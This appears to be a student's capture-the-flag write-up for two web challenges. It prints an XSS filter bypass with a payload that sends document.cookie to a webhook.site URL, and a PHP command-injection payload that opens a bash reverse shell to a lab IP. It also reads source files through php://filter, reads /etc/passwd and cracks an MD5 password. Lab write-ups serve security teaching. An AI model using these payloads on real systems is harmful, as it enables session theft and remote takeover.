\subsubsection*{the-confused-deputy}
{Flag} : \texttt{dL@stCTF431\{cssxss\}}\\ 
Viewing the source code, we see that there is a hidden input field, which is of password type, separate from the color input. Also, whatever input comes to the color text box, is first sanitized by the \texttt{sanitize()} function, however that just removes the first occurance of \texttt{<} and \texttt{>}. So we can bypass that by specifying, \texttt{<>payload}. Trying \texttt{<>\#green;\}</style> <script>alert(1);</script> //}, did not work, however,\\ \texttt{<>\#green;\}</style> <img src="lol" onerror = "alert(1)">} worked and I achieved javascript code execution. Next we go to the '/admin' page, put the link to visit as \texttt{http://10.0.118.48:7777/view}, and supply our crafted payload using \href{https://webhook.site}{webhook.site}, \\ \texttt{<>green;\}</style> <img src='lol' onerror="new Image().src='https:\textbackslash /\textbackslash /webhook.site/94b44b45-f1e3-4ec1\\-9d81-2d39c7de1a38?c='+ btoa(document.cookie)">}. The admin visits the page, and fills in this url, which sends the cookie to our webhook, we decode it from base64, to get the password, as dL@stCTF431\{cssxss\}.

\subsubsection*{body count}
{Flag} : \texttt{dL@stCTF431\{1nj3ct10n\_15\_p41nfu1\}}\\ (Note: while copying the flag, underscores are not copied. Some latex issue)\\ 
Once we load the challenge url, we observe that it is a php site, and there is a file, called \texttt{?file=wc.php}, so that gives us a hint that, there might be some other files on the server that can be looked into. Searching online for how to dump files using php, I found, \href{https://medium.com/@althubianymalek/exploring-php-wrappers-enhancing-php-capabilities-280a6af827b5}{a medium article}, that tells us we can use php filters. Dumping the entire code of wc.php, using \texttt{/?file=php://filter/convert.base64-encode/resource=wc.php}. We observe that RCE is possible, as \\ \texttt{exec('printf \'' . \$text . '\' | wc -c')} is present, and it takes in any input without sanitizing it. But first, we need the password. Looking at /robots.txt, to find any disallowed paths, we get the password from dumping the contents of \texttt{checkpass.php}, using, \texttt{/?file=php://filter/convert.base64-encode/resource=checkpass.php}. We finally get access to the wc program, and we can run any code we like using this payload \texttt{' \&\& our\_command \# '}. We try to get a reverse shell, using \href{https://www.revshells.com/}{revhsells.com}, we start a nc listener on our host machine, \texttt{nc -lvnp 9001}, and send the payload, \texttt{'\&\& bash -c "bash -i >\& /dev/tcp/10.7.12.140/9001 0>\&1"; \# '} to the wc.php program.

Once we get a reverse shell, we can finally execute commands. Looking into the \texttt{/tmp} directory, we observe that we don't have enough permissions. There are flags in the default directory as well, however no permissions to read them. We do \texttt{cat /etc/passwd}, and observe that a user anmed \texttt{ctf} is there, and there is also a directory \texttt{/ctf}. Peeping into that, we get a readme file and a whole bunch of nested folders. Reading the \texttt{README}, we get the md5 hash of the password. Running that through \href{https://md5decrypt.net/}{md5 decrypt}, we get our password, \texttt{cnsctf}. 
We then run \texttt{su ctf}, to switch to the ctf user (after entering the password). Then moving through the directories in /ctf directory, we arrive at the flag: \texttt{cat /ctf/system/of/a/down/flag.txt}, which gives us the flag.
